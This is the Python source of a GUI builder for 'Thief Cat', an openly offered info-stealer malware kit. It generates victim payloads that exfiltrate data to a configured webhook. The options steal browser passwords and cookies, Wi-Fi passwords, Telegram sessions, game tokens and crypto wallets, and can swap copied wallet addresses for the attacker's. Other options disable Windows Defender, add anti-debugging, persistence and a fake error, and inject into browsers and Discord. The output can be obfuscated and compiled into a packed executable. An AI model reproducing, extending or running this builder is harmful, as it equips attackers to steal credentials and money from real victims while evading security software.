import customtkinter
from customtkinter import filedialog as fd
import os
from PIL import Image
import requests
import time
import shutil
import webbrowser
import win32gui
import win32con
import base64
from pypresence import Presence
import json
import threading
import sys


custom_username = ""  

###################################################################################################################################
############################################ Clean@Builder: v9 ####################################################################
############################################ Clean@Author: https://github.com/NolayDscd ###########################################
############################################ Clean@Code: For Thief Cat ############################################################
###################################################################################################################################

# DISCORD RPC
try:
    client_id = '1125787771324342312'
    RPC = Presence(client_id)
    RPC.connect()
except:
    pass

def update():
     try:
        RPC.update(state=data['state'],
        details=data['details'],
        large_image=data['large_image'],
        small_image=data['small_image'],
        buttons=data['buttons'],
        start=data['time'])
     except:
         pass

data = {
     'state':"with Thief Cat",
     'details':"Rebuild the world",
     'large_image': ("https://raw.githubusercontent.com/meccksch/cerf/main/assets/d95it6h-ceaa1da3-727a-402f-8061-9a0a8e68af13.gif"),
     'large_text':None, 
     'small_image':"thiefcat",
     'small_text':None, 
     'buttons':[{"label": "Github", "url": "https://github.com/KSCH-58"}, {"label": "Telegram", "url": "https://t.me/+WvJrz6yv5AxkYjY8"}],
     'time': 1
      }
update()

def rpcloop():
    while True:
        try:
            update()
        except:
            pass
        time.sleep(20)

try:
    folder_path = "./ThiefCat_assets/bind"
    shutil.rmtree(folder_path)
    os.makedirs(os.path.join("ThiefCat_assets", "bind"), exist_ok=True)
    print("Folder /bind cleared.")
except:
    os.makedirs(os.path.join("ThiefCat_assets", "bind"), exist_ok=True)
    pass



class release():
    api_url = "https://api.github.com/repos/KSCH-58/Thief-Cat/releases/latest"
    response = requests.get(api_url)
    main_script = requests.get("https://raw.githubusercontent.com/KSCH-58/Thief-Cat/main/main.py").text

    if response.status_code == 200:

        latest_release = response.json()
        tag_name = latest_release["tag_name"]

        with open("./ThiefCat_assets/version/config.json", "r") as config_file:
            config_data = json.load(config_file)
            release_version = config_data["release"]

        if release_version != tag_name:
            print("Release found.")
            config_data["release"] = tag_name
            with open("./ThiefCat_assets/version/config.json", "w") as config_file:
                json.dump(config_data, config_file)
            print("[ Updated ] :  config.json")
            with open("main.py", "w", encoding="utf-8", newline="") as main_file:
                main_file.write(main_script.rstrip('\r\n'))
            print("[ Updated ] :  main.py")
    else:
        print("Request Failed: ", response.status_code)


###Main script
class ThiefCat(customtkinter.CTk):
    def __init__(self):
        self.icon_name = ""
        self.pingtype = "none"
        self.iconname = "ThiefCat_assets\img\\thiefcat.ico"
        self.bind_name = ""
        self.executable_name = ""
        self.bind_check = "no"
        self.hide = "no"
        self.icb = "no"

        super().__init__()
        self.protocol("WM_DELETE_WINDOW", self.on_close)

        #title, icon
        self.title("Thief Cat - Builder")
        self.geometry("820x580")
        self.iconbitmap("ThiefCat_assets\img\logo.ico")

        #base
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)

        #path img
        image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "ThiefCat_assets\img")
        self.logo = customtkinter.CTkImage(Image.open(os.path.join(image_path, "logo.png")), size=(80, 80))
        self.logo_ab = customtkinter.CTkImage(Image.open(os.path.join(image_path, "logo.png")), size=(200, 200))
        self.options = customtkinter.CTkImage(light_image = Image.open(os.path.join(image_path, "options_d.png")), dark_image = Image.open(os.path.join(image_path, "options_w.png")), size=(35, 35))
        self.crypto = customtkinter.CTkImage(light_image = Image.open(os.path.join(image_path, "crypto_d.png")), dark_image = Image.open(os.path.join(image_path, "crypto_w.png")), size=(35, 35))
        self.files = customtkinter.CTkImage(light_image = Image.open(os.path.join(image_path, "files_d.png")), dark_image = Image.open(os.path.join(image_path, "files_w.png")), size=(35, 35))
        self.icons = customtkinter.CTkImage(light_image = Image.open(os.path.join(image_path, "files_d.png")), dark_image = Image.open(os.path.join(image_path, "files_w.png")), size=(20, 20))
        self.build_img = customtkinter.CTkImage(light_image = Image.open(os.path.join(image_path, "build_d.png")), dark_image = Image.open(os.path.join(image_path, "build_w.png")), size=(35, 35))
        self.about = customtkinter.CTkImage(light_image = Image.open(os.path.join(image_path, "about_d.png")), dark_image = Image.open(os.path.join(image_path, "about_w.png")), size=(35, 35))
        self.arrow = customtkinter.CTkImage(light_image = Image.open(os.path.join(image_path, "arrow_d.png")), dark_image = Image.open(os.path.join(image_path, "arrow_w.png")), size=(50, 30))


        #List Frame
        self.options_frame = customtkinter.CTkFrame(self, fg_color="transparent")
        self.options_frame.grid_columnconfigure(0, weight=1)

        self.nav_frame = customtkinter.CTkFrame(self)
        self.nav_frame.grid(row=0, sticky="nsew")

        self.crypto_frame = customtkinter.CTkFrame(self, fg_color="transparent")
        self.crypto_frame.grid_columnconfigure(0, weight=1)

        self.build_frame = customtkinter.CTkFrame(self, fg_color="transparent")
        self.build_frame.grid_columnconfigure(0, weight=1)

        self.file_frame = customtkinter.CTkFrame(self, fg_color="transparent")
        self.file_frame.grid_columnconfigure(0, weight=1)

        self.about_frame = customtkinter.CTkFrame(self, fg_color="transparent")
        self.about_frame.grid_columnconfigure(0, weight=1)


        #Nav Bar
        self.nav_frame.grid_rowconfigure(7, weight=1)
        self.nav_label = customtkinter.CTkLabel(self.nav_frame, text="", image=self.logo)
        self.nav_label.grid(row=0, pady=(5, 15))

        self.option_button = customtkinter.CTkButton(self.nav_frame, corner_radius=5, text="", hover_color="#ff0026", image=self.options, command=self.option_event)
        self.option_button.grid(row=1, pady=(10, 35))

        self.crypto_button = customtkinter.CTkButton(self.nav_frame, corner_radius=5, text="", hover_color="#ff0026", image=self.crypto, command=self.crypto_event)
        self.crypto_button.grid(row=2, pady=(0, 35))

        self.file_button = customtkinter.CTkButton(self.nav_frame, corner_radius=5, text="", hover_color="#ff0026", image=self.files, command=self.file_event)
        self.file_button.grid(row=3, pady=(0, 35))

        self.build_button = customtkinter.CTkButton(self.nav_frame, corner_radius=5, text="", hover_color="#ff0026", image=self.build_img, command=self.build_event)
        self.build_button.grid(row=4, pady=(0, 35))

        self.about_button = customtkinter.CTkButton(self.nav_frame, corner_radius=5, text="", hover_color="#ff0026", image=self.about, command=self.about_event)
        self.about_button.grid(row=5, pady=(0, 35))

        self.app_mod = customtkinter.CTkComboBox(self.nav_frame, width=120, height=30, values=["System", "Light", "Dark"], command=self.change_app)
        self.app_mod.grid(row=6, pady=(0, 35))


        #Options category
        self.w3bh00k_input = customtkinter.CTkEntry(self.options_frame, width=420, fg_color=("gray75", "gray25"), placeholder_text="Enter your webhook")
        self.w3bh00k_input.grid(row=2, padx=40, pady=(15, 12))

        self.api_link_input = customtkinter.CTkEntry(self.options_frame, width=420, fg_color=("gray75", "gray25"), placeholder_text="Enter your api link")
        self.api_link_input.grid(row=3, padx=40, pady=(0, 13))

        self.w3bh00k_button = customtkinter.CTkButton(self.options_frame, width=120, height=30, fg_color=("gray75", "gray25"), hover_color="#ff0026", text="Check Webhook", command=self.c_button)
        self.w3bh00k_button.grid(row=2, column=2, padx=40, pady=(15, 5))

        self.n3m3_input = customtkinter.CTkEntry(self.options_frame, width=420, fg_color=("gray75", "gray25"), placeholder_text="Enter your file output name")
        self.n3m3_input.grid(row=4, padx=40, pady=(0, 13))

        self.icon_button = customtkinter.CTkButton(self.options_frame, width=30, height=30, fg_color="transparent", hover_color="#ff0026", text="", image=self.icons, command=self.icon)
        self.icon_button.grid(row=5, padx=40, pady=(0, 13))

        self.icon_check = customtkinter.CTkCheckBox(self.options_frame, text="Add icon on your exe (.ico)", fg_color=("gray75", "gray25"), hover_color="#ff0026", onvalue="yes",offvalue="no")
        self.icon_check.grid(row=5, sticky="nw", padx=40, pady=(0, 13))

        self.kill = customtkinter.CTkCheckBox(self.options_frame, text="Kill victim Discord Client", fg_color=("gray75", "gray25"), hover_color="#ff0026", onvalue=True, offvalue=False)
        self.kill.grid(row=6, sticky="nw", padx=40, pady=(0, 13))

        self.dbug = customtkinter.CTkCheckBox(self.options_frame, text="Enable Anti-Debug \n[Recommand yes, Kill Anti-Virus/Anti-Firewall/Anti-VM]?", fg_color=("gray75", "gray25"), hover_color="#ff0026", onvalue=True, offvalue=False)
        self.dbug.grid(row=7, sticky="nw", padx=40, pady=(0, 13))

        self.ping_new = customtkinter.CTkCheckBox(self.options_frame,text="Ping on new victim? (here/everyone)", fg_color=("gray75", "gray25"), hover_color="#ff0026",command=self.pings, onvalue="yes", offvalue="no")
        self.ping_new.grid(row=8, sticky="nw", padx=40, pady=(0, 13))

        self.ping_option = customtkinter.CTkComboBox(self.options_frame, width=120, height=30, values=["here", "everyone"], fg_color=("gray75", "gray25"))
        self.ping_option.grid(row=8, column=2, sticky="nw", padx=40, pady=(0, 13))

        self.wd = customtkinter.CTkCheckBox(self.options_frame, text="Disable Windows Defender \n(Can create error/detection Recommand \"no active\")", fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.wd.grid(row=9, sticky="nw", padx=40, pady=(0, 13))

        self.fake_err = customtkinter.CTkCheckBox(self.options_frame,text="Add a fake error", fg_color=("gray75", "gray25"), hover_color="#ff0026", onvalue='yes', offvalue='no')
        self.fake_err.grid(row=10, sticky="nw", padx=40, pady=(0, 13))

        self.startups = customtkinter.CTkCheckBox(self.options_frame, text="Add file to startup", fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.startups.grid(row=11, sticky="nw", padx=40, pady=(0, 13))

        self.hide = customtkinter.CTkCheckBox(self.options_frame, text="Hide Thief Cat console for victim", fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.hide.grid(row=12, sticky="nw", padx=40, pady=(0, 13))

        self.icb = customtkinter.CTkCheckBox(self.options_frame, text="Inject into all Browsers", fg_color=("gray75", "gray25"), hover_color="#ff0026", onvalue='yes', offvalue='no')
        self.icb.grid(row=13, sticky="nw", padx=40, pady=(0, 13))

        self.iacb = customtkinter.CTkCheckBox(self.options_frame, text="Inject in All Discord Clients", fg_color=("gray75", "gray25"), hover_color="#ff0026", onvalue='yes', offvalue='no')
        self.iacb.grid(row=14, sticky="nw", padx=40)

        self.next_option_button = customtkinter.CTkButton(self.options_frame, width=40, height=30, fg_color="transparent", hover_color=("gray75", "gray25"), text="", image=self.arrow, command=self.crypto_event)
        self.next_option_button.grid(row=14, column=2, padx=1)

        self.soundlilvoice = customtkinter.CTkCheckBox(self.options_frame, text="Enable Little Voice in headphones\n(Thief Cat Rap)", fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.soundlilvoice.grid(row=15, sticky="nw", padx=40, pady=(0, 13))


        #Crypto category

        self.active = customtkinter.CTkCheckBox(self.crypto_frame, text="Replace all copied crypto address wallet by your address", fg_color=("gray75", "gray25"), hover_color="#ff0026", onvalue='yes', offvalue='no')
        self.active.grid(row=1, sticky="nw", padx=40, pady=(15, 25))

        self.btc_input = customtkinter.CTkEntry(self.crypto_frame, width=420, fg_color=("gray75", "gray25"), placeholder_text="Your Bitcoin Address (let empty if you do not have)")
        self.btc_input.grid(row=3, padx=40, pady=(0, 25))

        self.eth_input = customtkinter.CTkEntry(self.crypto_frame, width=420, fg_color=("gray75", "gray25"), placeholder_text="Your Ethereum Address (let empty if you do not have)")
        self.eth_input.grid(row=5, padx=40, pady=(0, 25))

        self.xchain_input = customtkinter.CTkEntry(self.crypto_frame, width=420, fg_color=("gray75", "gray25"), placeholder_text="Your X-Chain Address (let empty if you do not have)")
        self.xchain_input.grid(row=7, padx=40, pady=(0, 25))

        self.pchain_input = customtkinter.CTkEntry(self.crypto_frame, width=420, fg_color=("gray75", "gray25"), placeholder_text="Your P-Chain Address (let empty if you do not have)")
        self.pchain_input.grid(row=9, padx=40, pady=(0, 25))

        self.cchain_input = customtkinter.CTkEntry(self.crypto_frame, width=420, fg_color=("gray75", "gray25"), placeholder_text="Your C-Chain Address (let empty if you do not have)")
        self.cchain_input.grid(row=11, padx=40, pady=(0, 25))

        self.monero_input = customtkinter.CTkEntry(self.crypto_frame, width=420, fg_color=("gray75", "gray25"), placeholder_text="Your Monero Address (let empty if you do not have)")
        self.monero_input.grid(row=13, padx=40, pady=(0, 25))

        self.ada_input = customtkinter.CTkEntry(self.crypto_frame, width=420, fg_color=("gray75", "gray25"), placeholder_text="Your Ada/Cardano Address (let empty if you do not have)")
        self.ada_input.grid(row=15, padx=40, pady=(0, 25))

        self.dash_input = customtkinter.CTkEntry(self.crypto_frame, width=420, fg_color=("gray75", "gray25"), placeholder_text="Your Dash Address (let empty if you do not have)")
        self.dash_input.grid(row=17, padx=40)

        self.next_cryptosteal_button = customtkinter.CTkButton(self.crypto_frame, width=40, height=30, fg_color="transparent",hover_color=("gray75", "gray25"), text="", image=self.arrow, command=self.file_event)
        self.next_cryptosteal_button.grid(row=17, column=2, padx=40)


        #File category
        self.browsers_button = customtkinter.CTkCheckBox(self.file_frame,text="Steal Browsers Files (Cookies/Password/etc...)", fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.browsers_button.grid(row=1, sticky="nw", padx=40, pady=(0, 24))

        self.antivirus_button = customtkinter.CTkCheckBox(self.file_frame,text="Steal all anti virus informations", fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.antivirus_button.grid(row=2, sticky="nw", padx=40, pady=(0, 24))

        self.mc_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal all games files", fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.mc_button.grid(row=3, sticky="nw", padx=40, pady=(0, 24))

        self.sys_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal systeme informations", fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.sys_button.grid(row=4, sticky="nw", padx=40, pady=(0, 24))

        self.roblox_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal roblox app token", fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.roblox_button.grid(row=5, sticky="nw", padx=40, pady=(0, 24))

        self.screen_button = customtkinter.CTkCheckBox(self.file_frame, text="Take screenshot", fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.screen_button.grid(row=6, sticky="nw", padx=40, pady=(0, 24))

        self.last_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal latest clipboard", fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.last_button.grid(row=7, sticky="nw", padx=40, pady=(0, 24))

        self.wifi_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal all wifi passwords", fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.wifi_button.grid(row=8, sticky="nw", padx=40, pady=(0, 24))

        self.launcher_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal all Games Launcher", fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.launcher_button.grid(row=9, sticky="nw", padx=40, pady=(0, 24))

        self.telegram_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal Telegram Session", fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.telegram_button.grid(row=10, sticky="nw", padx=40, pady=(0, 24))

        self.filezilla_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal FileZilla old connection", fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.filezilla_button.grid(row=11, sticky="nw", padx=40, pady=(0, 24))

        self.next_cryptosteal_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal Crypto Wallet (extension & app)", fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.next_cryptosteal_button.grid(row=12, sticky="nw", padx=40, pady=(0, 24))

        self.next_crypto_button = customtkinter.CTkButton(self.file_frame, width=40, height=30,fg_color="transparent",hover_color=("gray75", "gray25"), text="", image=self.arrow,command=self.build_event)
        self.next_crypto_button.grid(row=8, column=2, padx=40)

        #Select button defaut
        for button in [self.browsers_button, self.filezilla_button , self.telegram_button, self.next_cryptosteal_button, self.antivirus_button, self.mc_button, self.sys_button, self.roblox_button, self.screen_button, self.last_button, self.wifi_button, self.icb, self.iacb, self.hide, self.launcher_button]:
            button.select()


        #Build category
        self.bindbutton = customtkinter.CTkButton(self.build_frame, width=30, height=30, fg_color="transparent", hover_color="#ff0026", text="", image=self.icons, command=self.select_file)
        self.bindbutton.grid(row=3, padx=40, pady=(0, 13))

        self.bind_check = customtkinter.CTkCheckBox(self.build_frame, text="Add .exe or .bat to bind in your exe", fg_color=("gray75", "gray25"), hover_color="#ff0026", onvalue="yes",offvalue="no")
        self.bind_check.grid(row=3, sticky="nw", padx=40, pady=(0, 13))

        self.obf = customtkinter.CTkCheckBox(self.build_frame, text="Obfuscate the Thief Cat", fg_color=("gray75", "gray25"), hover_color="#ff0026", onvalue='yes', offvalue='no')
        self.obf.grid(row=1, sticky="nw", padx=40, pady=(20, 20))

        self.compy = customtkinter.CTkCheckBox(self.build_frame,text="Compil into .exe (Let Empty for .py)", fg_color=("gray75", "gray25"), hover_color="#ff0026", onvalue='yes', offvalue='no')
        self.compy.grid(row=2, sticky="nw", padx=40, pady=(20, 20))

        self.obf_name = customtkinter.CTkLabel(master=self.build_frame, text="Obfuscation Level")
        self.obf_name.grid(row=4, columnspan=2, padx=10, pady=(20, 5))

        self.num = customtkinter.CTkLabel(master=self.build_frame, text='          0%                                          25%                                         50%                                        75%                                        100%')
        self.num.grid(row=5, columnspan=1, padx=10, sticky="nw")

        self.obf_bar = customtkinter.CTkSlider(self.build_frame, from_=0, to=1, number_of_steps=4, fg_color=("gray75", "gray25"))
        self.obf_bar.grid(row=6, sticky="ew", padx=40, pady=(0, 20))

        self.pleasebuild = customtkinter.CTkButton(self.build_frame, width=150, height=50, fg_color=("gray75", "gray25"), hover_color="#ff0026", text="BUILD SCRIPT", command=lambda: self.build_scr(self.n3m3_input.get().replace(" ", "_"), self.w3bh00k_input.get()), compound="right")
        self.pleasebuild.grid(row=7, padx=0, pady=(20, 20))

        #About category
        self.img = customtkinter.CTkLabel(self.about_frame, text="", image=self.logo_ab)
        self.img.grid(row=0, pady=20)

        urls = [("Github", "https://github.com/KSCH-58"),("Website", "https://hawkish.eu/"),("Telegram", "https://t.me/+WvJrz6yv5AxkYjY8")]

        for i, (text, url) in enumerate(urls, start=3):
            button = customtkinter.CTkButton(self.about_frame, text=text, fg_color=("gray75", "gray25"),hover_color="#ff0026", command=lambda url=url: webbrowser.open(url))
            button.grid(row=i, pady=10)

        self.function("options")

    # Nav bar
    def function(self, name):
        buttons = [self.option_button, self.crypto_button, self.file_button, self.build_button, self.about_button]

        for button in buttons:
            button_name = button.cget("text").lower()
            button.configure(fg_color=("gray75", "gray25") if button_name == name else "transparent")

        frames = {
            "options": self.options_frame,
            "crypto": self.crypto_frame,
            "file": self.file_frame,
            "build": self.build_frame,
            "about": self.about_frame
        }

        for button_name, frame in frames.items():
            if button_name == name:
                frame.grid(row=0, column=1, sticky="nsew")
            else:
                frame.grid_forget()

    def change_app(self, new_app):
        customtkinter.set_appearance_mode(new_app)

    def on_close(self):
        self.destroy()
        sys.exit()

    #Options category
    def r_icon(self):
        self.icon_button.configure(fg_color="transparent", hover_color=("gray75", "gray25"), text="")

    def icon(self):
        self.icon_name = fd.askopenfilename()
        self.name_icon = os.path.basename(self.icon_name)
        if os.path.isfile(f"{self.icon_name}"):
            self.icon_button.configure(width=30, height=30, fg_color="green", hover_color=("gray75", "gray25"),text="")
            self.options_frame.after(3500, self.r_icon)
            pass
        else:
            self.icon_button.configure(width=30, height=30, fg_color="red", hover_color=("gray75", "gray25"),text="")
            self.options_frame.after(3500, self.r_icon)
        if self.icon_name.endswith('.ico'):
            pass
        else:
            self.icon_button.configure(width=30, height=30, fg_color="red", hover_color=("gray75", "gray25"),text="")
            self.options_frame.after(3500, self.r_icon)

    def select_file(self):
        filename = fd.askopenfilename(filetypes=[("Executable Files", "*.exe;*.bat")])
        if filename:
            try:
                file_name = os.path.basename(filename)
                destination_path = os.path.join("ThiefCat_assets", "bind", file_name)
                shutil.copy(filename, destination_path)
                self.bind_name = destination_path
                self.executable_name = file_name
            except:
                pass
        else:
            pass

    def v_w3bh00k(self):
        webhook = self.w3bh00k_input.get()
        try:
            r = requests.get(webhook, timeout=5)
            if r.status_code == 200:
                return True
            else:
                return False
        except requests.exceptions.RequestException:
            return False

    def c_button(self):
        if self.v_w3bh00k():
            self.w3bh00k_button.configure(width=120, height=30, fg_color="green", hover_color=("gray75", "gray25"), text="Valid Webhook")
            self.options_frame.after(3500, self.r_button)
        else:
            self.w3bh00k_button.configure(width=120, height=30, fg_color="red", hover_color=("gray75", "gray25"), text="Invalid Webhook")
            self.options_frame.after(3500, self.r_button)

    def r_button(self):
        self.w3bh00k_button.configure(fg_color=("gray75", "gray25"), hover_color="#ff0026", text="Check Webhook")

    def pings(self):
        if self.ping_new.get() == "yes":
            self.ping = "yes"
            self.pingtype = self.ping_option.get()
        else:
            self.ping = "no"
            self.pingtype = "none"

    #Nav Bar
    def option_event(self):
        self.function("options")

    def crypto_event(self):
        self.function("crypto")

    def build_event(self):
        self.function("build")

    def file_event(self):
        self.function("file")

    def about_event(self):
        self.function("about")

##BUILDER USING
    def reset_build(self):
        self.pleasebuild.configure(fg_color=("gray75", "gray25"), text="BUILD SCRIPT")

    def build_scr(self, filename, webhook):
        self.pleasebuild.configure(width=150, height=50, fg_color="green", hover_color=("gray75", "gray25"),text="Build currently starting")
        self.options_frame.after(5000, self.reset_build)
        self.mk_file(filename, webhook)
        self.cleanup(filename)
        self.renamefile(filename)

    def mk_file(self, filename,webhook):
        with open('./main.py', 'r', encoding="utf-8") as f:
            code = f.read()

        inputs = {
            'btc_input': 'btc_', 'eth_input': 'eth_',
            'xchain_input': 'xchain_', 'pchain_input': 'pchain_', 'cchain_input': 'cchain_',
            'monero_input': 'monero_',
            'ada_input': 'ada_',
            'dash_input': 'dash_'
        }

        for key, value in inputs.items():
            setattr(self, value, self.__dict__[key].get() if len(self.__dict__[key].get()) > 0 else 'none')

        if self.active.get() != "yes":
            inputs = {
                'btc_': '', 'eth_': '',
                'xchain_': '', 'pchain_': '', 'cchain_': '',
                'monero_': '',
                'ada_': '',
                'dash_': ''
            }

            for key, value in inputs.items():
                setattr(self, key, value)

        b64 = webhook.encode('utf-8')
        bs64 = base64.b64encode(b64)
        with open(f"{filename}.py", "w", encoding="utf-8") as f:
            f.write(code.replace('%B64_WBH_STR%', str(bs64).replace("b'", "").replace("'", ""))
                    .replace("%PC_CREATOR%", os.getenv("COMPUTERNAME"))
                    .replace("%USER_CREATOR%", custom_username)
                    .replace("%Ping_Options%", str(self.ping_new.get()))
                    .replace("%Disable_Defender_Options%", str(self.wd.get()))
                    .replace("%PingType_Options%", self.pingtype)
                    .replace("%CryptoReplacer_Options%", str(self.active.get()))
                    .replace("%Bind_Options%", self.executable_name)
                    .replace("%BTC_address_Options%", self.btc_)
                    .replace("%_ETH_address_Options%", self.eth_)
                    .replace("%_XCHAIN_address_Options%", self.xchain_)
                    .replace("%PCHAIN_address_Options%", self.pchain_)
                    .replace("%CCHAIN_address_Options%", self.cchain_)
                    .replace("%MONERO_address_Options%", self.monero_)
                    .replace("%ADA_address_Options%", self.ada_)
                    .replace("%DASH_address_Options%", self.dash_)
                    .replace("%_error_thiefcat%", str(self.fake_err.get()))
                    .replace("%Startup_Options%", str(self.startups.get()))
                    .replace("%Hide_Options%", str(self.hide.get()))
                    .replace("%Telegram_Options%", str(self.telegram_button.get()))
                    .replace("%_FileZilla_Options%", str(self.filezilla_button.get()))
                    .replace("'%KillDiscord_Options%'", str(self.kill.get()))
                    .replace("'%Debugger_Options%'", str(self.dbug.get()))
                    .replace("%_GetBrowsers_Options%", str(self.browsers_button.get()))
                    .replace("%AntiVirus_Options%", str(self.antivirus_button.get()))
                    .replace("%_Games_Options%", str(self.mc_button.get()))
                    .replace("%Sys_Options%", str(self.sys_button.get()))
                    .replace("%Roblox_Options%", str(self.roblox_button.get()))
                    .replace("%ClipBoard_Options%", str(self.last_button.get()))
                    .replace("%Screen_Options%", str(self.screen_button.get()))
                    .replace("%Wifi_Options%", str(self.wifi_button.get()))
                    .replace("%_Found_Launcher%", str(self.launcher_button.get()))
                    .replace("%Crypto_Options%", str(self.next_cryptosteal_button.get()))
                    .replace("%InjectBrowsers_Options%", str(self.icb.get()))
                    .replace("%InjectDiscord_Options%", str(self.iacb.get()))
                    .replace("%_LilVoice_Options%", str(self.soundlilvoice.get()))
                    .replace("%API_LINK%", str(self.api_link_input.get().replace("\n", ""))))

        time.sleep(2)
        
        if self.obf.get() == 'yes' and self.compy.get() == 'yes':
            self.encryption(f"{filename}")
            self.compile(f"obfuscated_{filename}")
        elif self.obf.get() == 'no' and self.compy.get() == 'yes':
            self.compile(f"{filename}")
        elif self.obf.get() == 'yes' and self.compy.get() == 'no':
            self.encryption(f"{filename}")
        else:
            pass

    def encryption(self, filename):
        os.system(f"python ./ThiefCat_assets/obfuscation/obfuscation.py -r -i {filename}.py -o obfuscated_{filename}.py -s {self.obf_bar.get() * 100}".replace(".0", ""))

    def compile(self, filename):
        icon_name = self.icon_name if self.icon_name else self.iconname
        icon = icon_name if self.icon_check.get() == 'yes' else "NONE"
        bind_option = ""
        if self.bind_check.get() == "yes" and self.bind_name:
            bind_option = f" --add-binary {self.bind_name};.'"
        hide_option = " --noconsole" if self.hide.get() == "yes" else ""
        icb_option = " --uac-admin" if self.icb.get() == "yes" else ""
        command = f'python ./ThiefCat_assets/MwlareBuilder/__main__.py --onefile --version-file=./ThiefCat_assets/version/version.txt{icb_option} --hiddenimport=pypiwin32{hide_option}{bind_option} --upx-dir=./ThiefCat_assets/upx -i {icon} --distpath ./ .\\{filename}.py'
        
        print(command)
        os.system(command)


    def cleanup(self, filename):
        cleans_dir = {'./__pycache__', './build'}
        cleans_file = {f'./{filename}.py',f'./{filename}.spec',f'./obfuscated_compressed_{filename}.py',f'./obfuscated_{filename}.py',f'./obfuscated_{filename}.spec',f'./compressed_{filename}.py',f'./compressed_{filename}.spec'}

        if self.obf.get() == 'yes' and self.compy.get() == 'no':
            cleans_file.add(f'./{filename}.py')
            cleans_file.remove(f'./obfuscated_{filename}.py')
        elif self.obf.get() == 'yes' and self.compy.get() == 'yes':
            cleans_file.add(f'./{filename}.py')
            cleans_file.add(f'./obfuscated_{filename}.spec')
        elif self.obf.get() == 'no' and self.compy.get() == 'no':
            cleans_file.remove(f'./{filename}.py')
        else:
            pass

        for clean in cleans_dir:
            try:
                if os.path.isdir(clean):
                    shutil.rmtree(clean)
            except Exception:
                pass
                continue

        for clean in cleans_file:
            try:
                if os.path.isfile(clean):
                    os.remove(clean)
            except Exception:
                pass
                continue

    def renamefile(self, filename):
        files = [f"./obfuscated_compressed_{filename}.py", f"./compressed_{filename}.py",
                 f"./compressed_{filename}.exe", f"./obfuscated_{filename}.py",
                 f"./obfuscated_compressed_{filename}.exe", f"./obfuscated_{filename}.exe"]
        for file in files:
            try:
                os.rename(file, f"./{filename}{os.path.splitext(file)[1]}")
            except Exception:
                pass


def app_threade():
    app = ThiefCat()
    app.mainloop()

def rpcloop_threade():
    rpcloop()


if __name__ == "__main__":
    # hide = win32gui.GetForegroundWindow()
    #win32gui.ShowWindow(hide, win32con.SW_HIDE)
    app_thread = threading.Thread(target=app_threade)
    rpcloop_thread = threading.Thread(target=rpcloop_threade)
    app_thread.start()
    rpcloop_thread.start()
    app_thread.join()
    rpcloop_thread.join()
